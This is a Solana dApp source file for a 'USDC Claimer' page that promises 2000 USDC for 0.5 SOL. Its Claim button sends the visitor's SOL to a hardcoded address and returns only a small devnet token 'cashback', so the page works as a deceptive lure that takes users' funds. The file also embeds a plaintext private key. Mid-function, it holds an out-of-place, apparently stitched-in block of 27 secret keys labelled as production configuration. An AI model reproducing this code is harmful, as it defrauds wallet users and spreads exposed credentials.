/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4d3CQmtcmEQNexwB1KojcQBPghnANX86o6aC9iMRPKAvNyjqq1fX1B8F7bz4KjyetktwRJEaYgZSusBmBL37T1wV"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3JynUAjKSieEBbFP4Lb2ZU7DLkyzzAw1Hrg5S3CQjz42MvGAegRPmFUaaqizdSNDa4t31ML7CtANxKD3GJDbMbdj",
  "key1": "5pdQz2L2Bcj4SbBjor8gtMrqWodepAfxhPPY5ZbPVUnbGyNJ6jS23nc7V8Y1BWDVQSjpbp6NopePCSJAf39TrRA3",
  "key2": "w2n9CRKvYy715DAjmQ1xYcC6oZA7De5aqeamqLD7HcE356KK5sWLUiNdVKvSK87DnoqgCHFnFrcuTPtP9hEgVUu",
  "key3": "4BZkEhRJMS67abui5S4YnoY7WKUMYBYsLEeMy9NgSPG6AxN3eYCLnWYQjjnXPTRLxcTT2j5fS1mM8aSLha3tviMJ",
  "key4": "567UP5t9tVtHkfeHNfgWnvEKfKvjLqtvwQ1m8d6StHkbNscojJRw68DhEgFZy1cqorUHfuafcf5be3ZvV4DCgPZh",
  "key5": "51HDf3wyMjnakcGD5HNLhcvxbh8r7diJ5agjrcktB56v57nZEtTCCabt4CGWNrem9mWo88A85zTk9XvDi2Lh31TG",
  "key6": "4SHHJmYPGjCCBgcJYkV8DyShMx34oEKYeeTVEGoyfunpYudW8RzbQAxbCJBZcb2mTT4QcUAtf49bAygsS8seWipk",
  "key7": "4F3nPX9TkPA7rFWaxSEHCJEc2gjUYBJcqxNT8JbBUvNANRAg8iF8UV1HKjggH79cnGCFETVpcToW1rExqtSpotvx",
  "key8": "xzXtBW6noQQcJ2HvFkXjeUv31q2KLLYGz6CNApRFM6YnzWbPCbMtyETHRGtmCUdoKf3v3Jp446eNs2tuMKZdYJb",
  "key9": "3oBhRyuaX6oMhitDujxJwGyt339SoAmHdFchuVkVY1b3fejsXhJ5tiF27GZbUtHH69rxByu79bQgarRBKSzan4X3",
  "key10": "3Pg4tNivLnFKUSHTDijk35zT5MfMT44zCSWotA2NC4o8FcYnNrcfF1q75LMDbZ7jbjRtDLNxtUTTPXSXkAVCBsSD",
  "key11": "5fZVDx2rFjtBfw4A4eETo2rJ44K2Q1LwdJWUEa6QdfJqLkfcGF16JLB1bzo9Qy5w9segcBsGbxcUKEkdsXWrtP2J",
  "key12": "3EnEE5WvQKs6SqjVSomfj9ZA2CNYpAWYrJDo9SPdWCPAoN4QTTHjo8cW1ysN9TPbyHDm6fa8jDfW8pY5XnxfZmMG",
  "key13": "5BV7LCUFXCCtQcPuz3gxSJfJyyjSSAvRNctKNzPCQ5QE3J5VMgcnkHFG3e9x7DRp4imFf8aDDQbg4JbXEn3QomLn",
  "key14": "54DPGidjUaKnvJtRTVC9uVworijvVjCWS7tu6uzpheC6WXT9rmeVqRHHdS5hoGpoQeGxgNyXau2fxTsWo5o3vzKH",
  "key15": "5K272odpV3RxjXudchzyQJjixYZJyBqaJm9DQ27hgNL5fRDTr2aXrspbzNQyXiYBta1K3FA5paegbHmDUmny1YVA",
  "key16": "56NKHiArkuawJNG5R1vCC93SuCE9ZDABN8FLJ1tWDCg6uPpkQrRPkmR2jkYBSAQvLSivXsv6DfWxFoTAjPC42eb4",
  "key17": "4nsU1WmJUEpRdVgJMvR3WTtvbzsUQGCuzvXAEBDvo715QbURdKoPLTMs52hN4gTkZF93bX2CF5SRuPSQCWiihnux",
  "key18": "5XcXaW194w6f347gscDYA8RdpsFxXLv94T4okzSwM8nXFLqrVV1UDFNywQvKDXVfoLgWUoaRsMAsU3Zmr5QwxfDz",
  "key19": "3xT2agsukKxiRQpXPY38VLJEKSzfoZNkyE3P8JxWXcyyQMc2dX4C92uwTnLX3FUsma4DGqzn3xL9wrB2JZ1cig2T",
  "key20": "32PPu8i1Lc4Zyioc967AuAEyXSCFx3Hi4THooee8U9PRxXd3ujzfA52s6eK1xT1XCHHGYjWLRrirejA2T2Te39Cw",
  "key21": "4m38ic6MoSVKJqNuWZa9mzaZHxXgE54HR9n5w6tfXhKKjKWMhoRHsdTni3hLcf87wk5rtW73qBvmHQd31gYYwtxA",
  "key22": "4DYFX9KdSWKP2DXHSGy4A22o3MdxtrnyRjiwD2uC9m4huemnWnWKcm8jr5uoCZjJWfXPyRJ8JTsKkofxbtPKs9Zm",
  "key23": "54kD9PkUK6jqo4s4tbpWzJ5ax8jbLVz7g5uDzXygYWyh7adc5Xe24e5AEXmgpBA6927vHSog1rZ4JPdSdUFraEec",
  "key24": "38pqdBK5ztcS8VJ4WwS2tPDLFrxjGiR4e36vMS5gXMC6nXgpiwgyfBq1s47oJTMe2h62AorXgyHKYPQ9qWRbDpsE",
  "key25": "2dYqPfRDdHHKyHYroukMwN67P1zjHveeLwBBkAdtqmK1gP6m6hQWXu1sMqByHw43cngXtCRoDRAEzynF5hUhzAhD",
  "key26": "2x9Bmw1CB3ZLGA2uMG5ZwxpcC7CVbjY7QpjEPd2E15xSesomyHF9qzq75NNsLdkumFEwjv2qiHqPbQsKG9Jgahyr"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
